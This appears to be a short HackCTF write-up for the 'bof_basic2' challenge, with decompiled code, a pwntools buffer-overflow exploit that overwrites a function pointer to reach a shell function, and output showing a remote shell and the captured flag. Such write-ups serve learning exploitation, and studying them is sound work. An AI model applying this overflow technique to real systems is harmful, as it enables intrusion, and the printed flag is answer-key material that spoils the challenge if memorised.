@@ -1,0 +1,45 @@
+root@kali:/home/kali/Downloads# ./bof_basic2 
+ls
+하아아아아아아아아앙
+
+undefined4 main(void)
+
+{
+  char local_94 [128];
+  code *local_14;
+  undefined *local_c;
+  
+  local_c = &stack0x00000004;
+  local_14 = sup;
+  fgets(local_94,0x85,stdin);
+  (*local_14)();
+  return 0;
+}
+
+symbolTable shell
+shell	0804849b	Function	undefined	Global	IMPORTED	3	0
+
+void shell(void)
+
+{
+  system("/bin/dash");
+  return;
+}
+from pwn import *
+p = remote("ctf.j0n9hyun.xyz","3001")
+payload = 'A'*128+"\x9b\x84\x04\x08"
+p.sendline(payload)
+p.interactive()
+p.close()
+
+>>> p32(0x0804849b)
+b'\x9b\x84\x04\x08'
+
+[+] Opening connection to ctf.j0n9hyun.xyz on port 3001: Done
+[*] Switching to interactive mode
+$ ls
+flag
+main
+$ cat flag
+HackCTF{h3y_dud3_600d_f0r_y0u}
+
